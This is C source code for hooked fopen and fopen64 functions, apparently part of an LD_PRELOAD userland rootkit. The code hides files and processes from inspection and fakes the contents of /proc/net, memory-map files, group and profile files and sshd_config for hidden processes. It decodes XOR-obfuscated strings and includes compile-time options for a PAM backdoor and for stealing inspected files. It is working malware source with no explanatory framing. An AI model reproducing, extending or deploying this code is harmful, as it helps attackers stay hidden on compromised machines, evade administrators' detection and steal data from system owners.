FILE *fopen(const char *pathname, const char *mode){
    hook(CFOPEN);

    int pidhidden = hidden_pid() || hidden_ppid();

    if(process("ls\0") || pidhidden){
        int gs;
        char *g;

        g = xordup(GROUP_PATH);
        if(g != NULL){
            gs = strcmp(pathname, g);
            clean(g);
            if(gs == 0) return forgegroups(pathname);
        }
    }
    if(pidhidden || magicusr()){
        int gs;
        char *g;

        g = xordup(REAL_PROFILE);
        if(g != NULL){
            gs = strcmp(pathname, g);
            clean(g);
            if(gs == 0){
                char *eprofile = xordup(ETC_PROFILE_PATH);
                if(eprofile){
                    FILE *rv = call(CFOPEN, eprofile, mode);
                    clean(eprofile);
                    return rv;
                }
            }
        }

        char *eprofile = xordup(ETC_PROFILE_PATH);
        if(eprofile){
            gs = strcmp(pathname, eprofile);
            clean(eprofile);
            if(gs == 0) return forgeprofile(pathname);
        }
    }
    

    if(magicusr())
        return call(CFOPEN, pathname, mode);

    if(hidden_path(pathname)){
        errno = ENOENT;
        return NULL;
    }

    if(isprocnet(pathname))
        return forge_procnet(pathname);

#if defined SOFT_PATCH && defined USE_PAM_BD
    char *sshd = xordup(SSHD_CONFIG);
    if(sshd != NULL){
        int sshi = strcmp(pathname, sshd);
        clean(sshd);
        if(sshi == 0 && sshdproc())
            return sshdforge(pathname);
    }
#endif

    if(!xfnmatch(MAPS_FULL_PATH, pathname) && procexists(pathname)) return forge_maps(pathname);
    if(!xfnmatch(SMAPS_FULL_PATH, pathname) && procexists(pathname)) return forge_smaps(pathname);
    if(!xfnmatch(NMAPS_FULL_PATH, pathname) && procexists(pathname)) return forge_numamaps(pathname);

    char cwd[PROCPATH_MAX_SIZE];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!xfnmatch(MAPS_PROC_PATH, pathname) && procexists(pathname)) return forge_maps(pathname);
            if(!xfnmatch(SMAPS_PROC_PATH, pathname) && procexists(pathname)) return forge_smaps(pathname);
            if(!xfnmatch(NMAPS_PROC_PATH, pathname) && procexists(pathname)) return forge_numamaps(pathname);
        }

        if(!xfnmatch(PROCPATH_PATTERN, cwd)){
            if(!xfnmatch(MAPS_FILENAME, pathname) && procexists(pathname)) return forge_maps(pathname);
            if(!xfnmatch(SMAPS_FILENAME, pathname) && procexists(pathname)) return forge_smaps(pathname);
            if(!xfnmatch(NMAPS_FILENAME, pathname) && procexists(pathname)) return forge_numamaps(pathname);
        }
    }

#ifdef ENABLE_STEAL
    inspectfile(pathname);
#endif
    return call(CFOPEN, pathname, mode);
}

FILE *fopen64(const char *pathname, const char *mode){
    hook(CFOPEN64);

    int pidhidden = hidden_pid() || hidden_ppid();

    if(process("ls\0") || pidhidden){
        int gs;
        char *g;

        g = xordup(GROUP_PATH);
        if(g != NULL){
            gs = strcmp(pathname, g);
            clean(g);
            if(gs == 0) return forgegroups(pathname);
        }
    }
    if(pidhidden || magicusr()){
        int gs;
        char *g;

        g = xordup(REAL_PROFILE);
        if(g != NULL){
            gs = strcmp(pathname, g);
            clean(g);
            if(gs == 0){
                char *eprofile = xordup(ETC_PROFILE_PATH);
                if(eprofile){
                    FILE *rv = call(CFOPEN64, eprofile, mode);
                    clean(eprofile);
                    return rv;
                }
            }
        }

        char *eprofile = xordup(ETC_PROFILE_PATH);
        if(eprofile){
            gs = strcmp(pathname, eprofile);
            clean(eprofile);
            if(gs == 0) return forgeprofile(pathname);
        }
    }

    if(magicusr())
        return call(CFOPEN64, pathname, mode);

    if(hidden_path(pathname)){
        errno = ENOENT;
        return NULL;
    }

    if(isprocnet(pathname))
        return forge_procnet(pathname);

#if defined SOFT_PATCH && defined USE_PAM_BD
    char *sshd = xordup(SSHD_CONFIG);
    if(sshd != NULL){
        int sshi = strcmp(pathname, sshd);
        clean(sshd);
        if(sshi == 0 && sshdproc())
            return sshdforge(pathname);
    }
#endif

    if(!xfnmatch(MAPS_FULL_PATH, pathname) && procexists(pathname)) return forge_maps(pathname);
    if(!xfnmatch(SMAPS_FULL_PATH, pathname) && procexists(pathname)) return forge_smaps(pathname);
    if(!xfnmatch(NMAPS_FULL_PATH, pathname) && procexists(pathname)) return forge_numamaps(pathname);

    char cwd[PROCPATH_MAX_SIZE];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!xfnmatch(MAPS_PROC_PATH, pathname) && procexists(pathname)) return forge_maps(pathname);
            if(!xfnmatch(SMAPS_PROC_PATH, pathname) && procexists(pathname)) return forge_smaps(pathname);
            if(!xfnmatch(NMAPS_PROC_PATH, pathname) && procexists(pathname)) return forge_numamaps(pathname);
        }

        if(!xfnmatch(PROCPATH_PATTERN, cwd)){
            if(!xfnmatch(MAPS_FILENAME, pathname) && procexists(pathname)) return forge_maps(pathname);
            if(!xfnmatch(SMAPS_FILENAME, pathname) && procexists(pathname)) return forge_smaps(pathname);
            if(!xfnmatch(NMAPS_FILENAME, pathname) && procexists(pathname)) return forge_numamaps(pathname);
        }
    }

#ifdef ENABLE_STEAL
    inspectfile(pathname);
#endif
    return call(CFOPEN64, pathname, mode);
}
